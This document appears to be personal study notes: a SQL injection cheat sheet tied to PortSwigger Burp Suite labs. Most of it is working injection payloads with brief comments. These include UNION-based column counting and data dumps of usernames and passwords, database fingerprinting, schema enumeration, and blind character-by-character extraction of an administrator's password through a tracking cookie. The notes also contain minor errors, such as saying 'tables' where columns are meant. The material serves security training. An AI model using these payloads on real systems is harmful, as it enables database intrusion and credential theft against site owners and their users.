```markdown
### SQL Injection Cheat Sheet

[PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Union Attack

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

In a union attack, The same amout of data needs to be displayed as the output field on the website.

### Find the Number of Columns

```sql
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3-- 
```

If the number of `NULL`s doesn’t match the number of columns, you will get an error.

```sql
' UNION SELECT NULL--  
' UNION SELECT NULL,NULL-- 
' UNION SELECT NULL,NULL,NULL-- 
```

Use this to find the number of tables. Then check to find where different types of data can be printed.

```sql
' UNION SELECT 'a',NULL,NULL,NULL--  
' UNION SELECT NULL,'a',NULL,NULL--  
' UNION SELECT NULL,NULL,'a',NULL--  
' UNION SELECT NULL,NULL,NULL,'a'-- 
```

```sql
" || (SELECT GROUP_CONCAT(sql) FROM sqlite_schema) || " 
```

Conversion failed when converting the `varchar` value `'a'` to data type `int`.

### Find Data

```sql
' UNION SELECT username, password FROM users-- 
```

Combine two pieces of data in one column:

```sql
' UNION SELECT username || '~' || password FROM users-- 
```

### Finding Database Types

#### Microsoft, MySQL

```sql
SELECT @@version
```

#### Oracle

```sql
SELECT * FROM v$version
```

#### PostgreSQL

```sql
SELECT version()
```

```sql
' UNION SELECT @@version# 
' UNION SELECT @@version-- 
' UNION SELECT * FROM v$version-- 
' UNION SELECT version()-- 
```

### Types of SQL Comments

If `--` doesn’t work:

#### Oracle

```sql
--comment  
```

#### Microsoft

```sql
--comment 
/*comment*/  
```

#### PostgreSQL

```sql
--comment 
/*comment*/  
```

#### MySQL

```sql
#comment 
-- comment [Note the space after the double dash] 
/*comment*/ 
```

## Find What's in a Database

### List Tables and Table Info

```sql
SELECT * FROM information_schema.tables [won’t work for Oracle] 
```

### List Columns in Tables

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE' 
```

When needed, add `NULL` before or after the `*`.

If it only takes 2 inputs:

```sql
'UNION+SELECT NULL,TABLE_NAME FROM information_schema.tables-- 
```

## Blind SQL Injection

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm 
```

This will return `TRUE` if the first character of the admin's password is greater than `m`. Then you can do:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't 
xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a 
xyz' AND SUBSTRING((SELECT password FROM users WHERE Username = 'administrator'), 1, 1) > 't 
```

If this is false, it is less than `t`. Keep going until you find:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's 
```

It is true.

The `SUBSTRING` function is called `SUBSTR` sometimes.

### Find the Length of the Password

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a 
```

Then:

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a 
```

## Oracle

```sql
' UNION SELECT NULL FROM DUAL-- 
```

`DUAL` is a built-in Oracle database table.

## Burp Suite Labs

```sql
' UNION SELECT NULL,@@version# 
```

```sql
'+UNION+SELECT NULL,TABLE_NAME FROM information_schema.tables-- 
'+UNION+SELECT NULL,COLUMN_NAME FROM information_schema.columns WHERE table_name = 'users_tvqqei'-- 
'+UNION+SELECT username_smduqm || '~' || password_jxbxqv,NULL FROM users_tvqqei-- 
```
```

